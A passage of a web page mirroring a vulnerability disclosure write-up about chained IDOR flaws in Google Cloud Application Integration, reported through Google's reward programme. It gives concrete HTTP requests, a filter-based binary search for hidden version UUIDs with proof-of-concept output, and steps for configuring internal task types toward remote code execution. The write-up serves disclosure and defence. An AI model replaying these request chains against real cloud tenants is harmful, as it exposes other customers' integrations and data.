+      <span>"triggerId"</span><span>:</span> <span>"api_trigger/AI_bebbia_CreateWOSubs_API_1"</span><span>,</span>
+      <span>"testInputParameters"</span><span>:</span> <span>[</span>
+        <span>{</span>
+          <span>"key"</span><span>:</span> <span>"InputData"</span><span>,</span>
+          <span>"dataType"</span><span>:</span> <span>"JSON_VALUE"</span><span>,</span>
+          <span>"defaultValue"</span><span>:</span> <span>{</span>
+            <span>"jsonValue"</span><span>:</span> <span>"{\n  \"OldSKU\": \"300465\",\n  \"orderid\": \"7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\",\n  ...\n}"</span>
+          <span>}</span><span>,</span>
+          <span>"displayName"</span><span>:</span> <span>"InputData"</span>
+        <span>}</span>
+      <span>]</span><span>,</span>
+      <span>"creatorEmail"</span><span>:</span> <span>"redacted@google.com"</span><span>,</span>
+      ...
+    <span>}</span>
+  <span>]</span>
+<span>}</span></code></pre><p>Looking closer at the response though, you may notice something off. The <code>versions/...</code> segment in every result is <code>631a0566-02fc-4dce-b319-25e2c68168f4</code>. That's <em>my</em> version UUID, the one I sent in field <code>1</code>. The API was just reflecting it straight back into every test case's <code>name</code>, even though these test cases belong to completely different integrations in different projects.</p>
+<p>So while I now had every test case ID across every GCP project, along with their integration names and creator emails, the actual victim version UUIDs which I needed to feed into those IDORs from earlier were nowhere in the response.</p>
+<p>That said, the test case IDs alone were already good for some real impact. Application Integration exposes an <code>:executeTest</code> endpoint that runs a test case by its ID, and it didn't actually need the victim's real version UUID.</p>
+<p><strong>Request</strong></p>
+<pre><code><span>POST</span> <span>/v1/projects/&lt;your-project&gt;/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>integrations.googleapis.com
+<span>Authorization</span><span>: </span>Bearer &lt;redacted&gt;
+<span>Content-Length</span><span>: </span>0</code></pre><p><strong>Response</strong></p>
+<pre><code><span>{</span>
+  <span>"executionId"</span><span>:</span> <span>"5d49abed-7692-47aa-8660-5cdaea92d2af"</span><span>,</span>
+  <span>"outputParameters"</span><span>:</span> <span>{</span>
+    <span>"output"</span><span>:</span> <span>3</span>
+  <span>}</span><span>,</span>
+  <span>"assertionResults"</span><span>:</span> <span>[</span>
+    <span>{</span>
+      <span>"assertion"</span><span>:</span> <span>{</span>
+        <span>"assertionStrategy"</span><span>:</span> <span>"ASSERT_EQUALS"</span><span>,</span>
+        <span>"parameter"</span><span>:</span> <span>{</span>
+          <span>"key"</span><span>:</span> <span>"output"</span><span>,</span>
+          <span>"value"</span><span>:</span> <span>{</span> <span>"intValue"</span><span>:</span> <span>"3"</span> <span>}</span>
+        <span>}</span>
+      <span>}</span><span>,</span>
+      <span>"taskNumber"</span><span>:</span> <span>"1"</span><span>,</span>
+      <span>"taskName"</span><span>:</span> <span>"JsonnetMapperTask"</span><span>,</span>
+      <span>"status"</span><span>:</span> <span>"SUCCEEDED"</span>
+    <span>}</span>
+  <span>]</span><span>,</span>
+  <span>"testExecutionState"</span><span>:</span> <span>"PASSED"</span>
+<span>}</span></code></pre><p>So I could already trigger arbitrary test cases to execute in any victim's environment, but the real goal was still to access a victim's entire integration through the IDORs from earlier, and for that I needed the actual version UUID.</p>
+<p>I was stuck here for a bit. That was, until I had an idea. The <code>filter</code> parameter (field <code>2</code>) clearly supports comparison operators like <code>=</code>. What if it also supports <code>&gt;</code> and <code>&lt;=</code>? If it does, I could anchor on a known test case ID and then binary search the <code>workflow_id</code> field, one hex character at a time, until I'd reconstructed the entire UUID:</p>
+<pre><code>id = "&lt;known-tc-uuid&gt;" AND workflow_id &gt; "&lt;low&gt;" AND workflow_id &lt;= "&lt;high&gt;"</code></pre><p>Each request narrows the range. If the test case still appears in the response, the real <code>workflow_id</code> is in <code>(low, high]</code>, otherwise it's outside. A 32-character hex UUID should in theory fall out in around 128 requests.</p>
+<p>I had Claude write a PoC for this, and it worked perfectly first try:</p>
+<pre><code>$ python extract_by_id.py --token "&lt;redacted&gt;" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"
+Test case: 60413427-4d07-4c36-bce0-66cfcdd81879
+Parent:    projects/273897706296/locations/us-central1/integrations/x/versions/-
+
+Verified: target found. Starting binary search...
+
+  [ 4/32] fb1d0000-0000-0000-0000-000000000000  (16 reqs)
+  [ 8/32] fb1dc5f3-0000-0000-0000-000000000000  (32 reqs)
+  [12/32] fb1dc5f3-0380-0000-0000-000000000000  (48 reqs)
+  [16/32] fb1dc5f3-0380-491c-0000-000000000000  (64 reqs)
+  [20/32] fb1dc5f3-0380-491c-af90-000000000000  (80 reqs)
+  [24/32] fb1dc5f3-0380-491c-af90-5a1400000000  (96 reqs)
+  [28/32] fb1dc5f3-0380-491c-af90-5a141aa00000  (112 reqs)
+  [32/32] fb1dc5f3-0380-491c-af90-5a141aa02f56  (128 reqs)
+
+workflow_id: fb1dc5f3-0380-491c-af90-5a141aa02f56
+Total requests: 128</code></pre><p>I now had the victim's actual integration version UUID. Chaining this with the <code>GetIntegrationVersion</code> IDOR:</p>
+<pre><code><span>GET</span> <span>/v1/projects/&lt;your-project&gt;/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>integrations.googleapis.com
+<span>Authorization</span><span>: </span>Bearer &lt;redacted&gt;</code></pre><p>It returned the full integration belonging to a different project, including every trigger config, task config, parameter binding, and creator email:</p>
+<pre><code><span>{</span>
+  <span>"name"</span><span>:</span> <span>"projects/&lt;your-project&gt;/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56"</span><span>,</span>
+  <span>"state"</span><span>:</span> <span>"DRAFT"</span><span>,</span>
+  <span>"triggerConfigs"</span><span>:</span> <span>[</span>
+    <span>{</span>
+      <span>"label"</span><span>:</span> <span>"API Trigger"</span><span>,</span>
+      <span>"triggerType"</span><span>:</span> <span>"API"</span><span>,</span>
+      <span>"triggerId"</span><span>:</span> <span>"api_trigger/TestCasePOC5_API_1"</span>
+    <span>}</span>
+  <span>]</span><span>,</span>
+  <span>"taskConfigs"</span><span>:</span> <span>[</span>
+    <span>{</span>
+      <span>"task"</span><span>:</span> <span>"GenericRestV2Task"</span><span>,</span>
+      <span>"displayName"</span><span>:</span> <span>"Call REST Endpoint"</span><span>,</span>
+      <span>"parameters"</span><span>:</span> <span>{</span>
+        <span>"url"</span><span>:</span> <span>{</span> <span>"key"</span><span>:</span> <span>"url"</span><span>,</span> <span>"value"</span><span>:</span> <span>{</span> <span>"stringValue"</span><span>:</span> <span>"$url$"</span> <span>}</span> <span>}</span><span>,</span>
+        <span>"httpMethod"</span><span>:</span> <span>{</span> <span>"key"</span><span>:</span> <span>"httpMethod"</span><span>,</span> <span>"value"</span><span>:</span> <span>{</span> <span>"stringValue"</span><span>:</span> <span>"POST"</span> <span>}</span> <span>}</span><span>,</span>
+        <span>"authConfigName"</span><span>:</span> <span>{</span> <span>"key"</span><span>:</span> <span>"authConfigName"</span><span>,</span> <span>"value"</span><span>:</span> <span>{</span> <span>"stringValue"</span><span>:</span> <span>"authprofiletest"</span> <span>}</span> <span>}</span>
+      <span>}</span>
+    <span>}</span>
+  <span>]</span><span>,</span>
+  ...
+  <span>"integrationParameters"</span><span>:</span> <span>[</span>
+    <span>{</span> <span>"key"</span><span>:</span> <span>"url"</span><span>,</span> <span>"dataType"</span><span>:</span> <span>"STRING_VALUE"</span><span>,</span> <span>"defaultValue"</span><span>:</span> <span>{</span> <span>"stringValue"</span><span>:</span> <span>"https://example.com"</span> <span>}</span> <span>}</span>
+  <span>]</span><span>,</span>
+  <span>"lastModifierEmail"</span><span>:</span> <span>"gvrptest4@gmail.com"</span><span>,</span>
+  <span>"createTime"</span><span>:</span> <span>"2026-03-22T11:10:30.087Z"</span>
+<span>}</span></code></pre><p>If you remember from the original test cases dump, a fair number of those <code>creatorEmail</code> fields ended in <code>@google.com</code>. So there are plenty of internal Google teams running their own integrations on this platform. My obvious next thought was what if some of these Googler integrations already have <code>GenericStubbyTypedTaskV2</code> (or other internal-only tasks like <code>PythonTask</code>, <code>CreateBuganizerIssueTask</code>, etc.) configured? Any one of those would extend this cross-tenant chain into something significantly worse.</p>
+<p>I couldn't actually check though. Doing so would mean iterating over real customer data which would break the Google VRP rules, so I bundled up everything I had and sent the report off to Cloud VRP.</p>
+<h3><a href="#configuring-internal-task-types" target="_blank" rel="noopener noreferrer">#</a>Configuring internal task types</h3><p>This made me think though, what exactly was stopping me from creating my own integration with an internal task type?</p>
+<p>If I tried to create an internal task:</p>
+<pre><code><span>POST</span> <span>/v1/projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>integrations.googleapis.com
+<span>Authorization</span><span>: </span>Bearer &lt;redacted&gt;
+<span>Content-Length</span><span>: </span>1033
+
+<span>{
+  <span>"taskConfigsInternal"</span>: [
+    {
+      <span>"taskNumber"</span>: <span>"1"</span>,
+      <span>"taskName"</span>: <span>"PythonTask"</span>,
+      ...
+      <span>"taskEntity"</span>: {
+        <span>"uiConfig"</span>: {
+          <span>"taskUiModuleConfigs"</span>: [
+            {
+              <span>"moduleId"</span>: <span>"RPC_TYPED"</span>
+            }
+          ]
+        }
+      },
+      <span>"taskType"</span>: <span>"ASIS_TEMPLATE"</span>,
+      <span>"parameters"</span>: {
+        <span>"TEST"</span>: {
+          <span>"key"</span>: <span>"test"</span>,
+          <span>"value"</span>: {
+            <span>"stringValue"</span>: <span>"test"</span>
+          }
+        }
+      }
+    }
+  ],
+  ...
+}</span></code></pre><p>It would actually work:</p>
+<pre><code><span>HTTP/2</span> <span>200</span> OK
+<span>Content-Type</span><span>: </span>application/json; charset=UTF-8
+
+<span>{
+  <span>"name"</span>: <span>"projects/273897706296/locations/us-central1/integrations/ExampleTest1234/versions/304adc1b-6d09-4b2d-a070-db48b821879a"</span>,
+  <span>"origin"</span>: <span>"UI"</span>,
+  <span>"snapshotNumber"</span>: <span>"1"</span>,
+  <span>"updateTime"</span>: <span>"2026-05-01T07:30:07.182512Z"</span>,
+  <span>"lockHolder"</span>: <span>"gvrptest4<span>@gmail</span>.com"</span>,
+  <span>"createTime"</span>: <span>"2026-05-01T07:30:07.182512Z"</span>,
+  <span>"lastModifierEmail"</span>: <span>"gvrptest4<span>@gmail</span>.com"</span>,
+  <span>"state"</span>: <span>"DRAFT"</span>,
+  ...
+}</span></code></pre><p>But when I tried to actually execute the workflow, it would just time out with the following error:</p>
+<pre><code> Execution timeout, cancelled graph execution. The default timeout is 2min for sync execution and 10min for async execution. If you are using sync execution, please try async execution such as the Schedule API or Cloud Scheduler trigger. If you are already using async execution, please try to break down your integration into smaller pieces and chain them in the async way. Note any variable contains large data will also failed to upload to GCS. error/code: 'common_error_code: SYNC_EVENTBUS_EXECUTION_TIMEOUT'' </code></pre><p>However, I noticed something peculiar. When I configured the <code>PythonTask</code> (one of the internal tasks), created a test case and executed the test case, instead of timing out, I got this suspicious error on the frontend:</p>
+<pre><code><span>{</span>
+  <span>"1"</span><span>:</span> <span>9</span><span>,</span>
+  <span>"2"</span><span>:</span> <span>"java.io.IOException: No space left on device"</span>
+<span>}</span></code></pre><p>That's a real exception from the execution backend, not a timeout. Whatever code path the test case feature was running on, it was happily reaching deep enough to fail on actual disk I/O. Trying the same trick with <code>GenericStubbyTypedTaskV2</code> got me a less informative but equally suspicious response:</p>
+<pre><code>Failed to execute test case. Error: Unknown Error.</code></pre><p>I checked the workflow execution logs, and that's when the actual error showed up:</p>
+<pre><code><span>{</span> <span>"message"</span><span>:</span> <span>"com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w "</span><span>,</span> <span>"code"</span><span>:</span> <span>500</span> <span>}</span></code></pre><p>This is extremely suspicious. I was definitely onto something. By hitting:</p>
+<pre><code>GET /v1/projects/&lt;project&gt;/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download
+<span>Host</span><span>: </span>integrations.googleapis.com</code></pre><p>It was possible to pull the entire stack trace:</p>
+<pre><code>com.google.enterprise.crm.exceptions.IpCanonicalCodeException: com.google.enterprise.crm.eventbus.testcase.task.mock.MockExecutionFailureException: com.google.net.rpc3.client.RpcClientException: &lt;eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/&gt; APPLICATION_ERROR;enterprise.crm.eventbus.stubby/EventbusStubbyCallerService.ExecuteStubbyCall;com.google.security.authentication.common.CredentialsUnsupportedException: UberMint verification is disabled. You can enable it in AuthenticationMethods; RpcSecurityPolicy http://rpcsp/p/4aPF9XD3vQ_2KYxu2J59zxrLEzDa2CDMRzIYnrADC4w ;AppErrorCode=16;StartTimeMs=1774319566778;unknown;ResFormat=uncompressed;ServerTimeSec=0.00194812;LogBytes=256;FailFast;EffSecLevel=none;ReqFormat=uncompressed;ReqID=bea3d76b582d8a4;GlobalID=0;Server=[2002:a05:6670:4003:b0:ced:80ad:4c54]:4001 Code: FAILED_PRECONDITION
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:744)
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.serialize(EventParametersUtil.java:725)
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.toParameterValueType(EventParametersUtil.java:654)
+	at app//com.google.enterprise.crm.platform.eventbus.v3.EventParametersUtil.lambda$addEventParametersToEventMessage$0(EventParametersUtil.java:475)
+	at /java.base@25.0.1/java.util.stream.ReferencePipeline$3$1.accept(Unknown Source)
+  ...</code></pre><p>This made it clear that our variables were being plugged straight into an <code>ExecuteStubbyCallRequest</code> on the backend. Based on the stack traces from playing around with parameter values, I'd guess the backend code looks roughly like:</p>
+<pre><code>GenericStubbyTypedTaskV2.buildRequest():
+    line <span>219</span>: setServerAddress(serverSpec)  → ExecuteStubbyCallRequest.java:<span>1123</span>
+    line <span>220</span>: setServiceName(serviceName)   → ExecuteStubbyCallRequest.java:<span>1219</span>
+    line <span>221</span>: setMethodName(serviceMethod)  → ExecuteStubbyCallRequest.java:<span>1313</span>
+    ...</code></pre><p>So maybe there was some parameter I had to supply to get this working? The problem was the stack traces only helped me leak the three known parameters, <code>serverSpec</code>, <code>serviceName</code>, and <code>serviceMethod</code> but I wasn't able to find more from this method. Also, Google treats these RCE escalations as security incidents, so before going any further I asked Google's security team for the green light. They got back to me quickly and confirmed that this was exploitable and that I should stop further testing.</p>
+<p>The report was quickly escalated to <strong>P0/S0</strong> and got a 🎉<strong>Nice catch!</strong>. Almost a month later, the report was awarded <strong>$75,000</strong> under "Compromise of Google Cloud Production Environment", my highest single bounty to-date.</p>
+<p>From what I'd gathered from speaking to some Googlers, there are roughly three tiers for base RCE payouts under the <a href="https://bughunters.google.com/about/rules/google-friends/cloud-vulnerability-reward-program-rules#reward-amounts" target="_blank" rel="noopener noreferrer">Cloud VRP table</a>:</p>
+<ul>
+<li><strong>$50k</strong>: Relatively unprivileged production user access</li>
+<li><strong>$75k</strong>: Privileged production user access</li>
+<li><strong>$100k</strong>: Admin in Google Cloud</li>
+</ul>
+<p>Where any given RCE actually lands on this scale depends entirely on how much of the production environment the compromised prod identity can reach directly. Obviously, given the vast attack surface accessible from production access, it's very likely possible to escalate privileges from any sort of initial access.</p>
+<p>Google was oddly vague about the exact reasoning here, but it seemed that the internal team's own investigation of this chain surfaced significantly more impact in prod than even what I had shown, which is what landed it at the $75k tier.</p>
+<h3><a href="#timeline-2nd-rce" target="_blank" rel="noopener noreferrer">#</a>Timeline (2nd RCE)</h3><ul>
+<li>2026-03-21 - Initial report sent to Google</li>
+<li>2026-03-23 - Google triaged report as P1/S1</li>
+<li>2026-03-23 - Informed Google's security team about the RCE escalation</li>
+<li>2026-03-23 - 🎉 <strong>Nice catch!</strong>, report updated to P0/S0</li>
+<li>2026-04-28 - <strong>Panel awards $75,000</strong>. Rationale for this decision: Vulnerability category is "Compromise of Google Cloud Production Environment". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.</li>
+<li>2026-05-06 - Informed Google that GetIntegrationVersion RPC was still vulnerable</li>
+<li>2026-05-08 - <strong>Panel awards additional $13,337</strong>. Rationale for this decision: Vulnerability category is "Single-Service Privilege Escalation - WRITE". Vulnerabilities without any interaction or relationship between attacker and victim. Default Google Cloud products.</li>
+</ul>
+</div> <footer class="article-footer" data-astro-cid-wrgicudb> <div class="action-row" data-astro-cid-wrgicudb> <a href="https://brutecat.com/articles/google-cloud-rce" target="_blank" rel="noopener noreferrer" class="read-original-btn" data-astro-cid-wrgicudb>
+阅读原文 ↗
+</a> </div> <div class="back-to-list" data-astro-cid-wrgicudb> <a href="/reading-list" class="back-link" data-astro-prefetch data-astro-cid-wrgicudb>← 返回订阅列表</a> </div> </footer> </article> </div>  </main> <footer class="site-footer" aria-label="Site footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <p class="footer-text footer-text--strong" data-astro-cid-sz7xmlte>
+&copy; 2026 雅俗共赏 </p> <p class="footer-text" data-astro-cid-sz7xmlte>记录技术、阅读与开源更新</p> <p class="footer-text footer-text--secondary" data-astro-cid-sz7xmlte>
+Built with  <a href="https://astro.build/" target="_blank" rel="noopener noreferrer" class="footer-link" data-astro-cid-sz7xmlte>
+Astro
+</a> </p> </div> </footer> <button id="back-to-top" class="back-to-top" type="button" aria-label="回到顶部" hidden data-astro-cid-wlspcwf4> <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" data-astro-cid-wlspcwf4> <path d="M18 15l-6-6-6 6" data-astro-cid-wlspcwf4></path> </svg> </button> <script type="module">function o(){const e=document.getElementById("back-to-top");if(!e)return;const s=300;let t=!1;const n=()=>{const i=window.scrollY>s;e.hidden=!i,t=!1},d=()=>{t||(requestAnimationFrame(n),t=!0)};e.addEventListener("click",()=>{window.scrollTo({top:0,behavior:"smooth"})}),window.addEventListener("scroll",d,{passive:!0}),n(),document.addEventListener("astro:before-swap",()=>{window.removeEventListener("scroll",d)},{once:!0})}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",o):o();document.addEventListener("astro:page-load",o);</script></body></html>
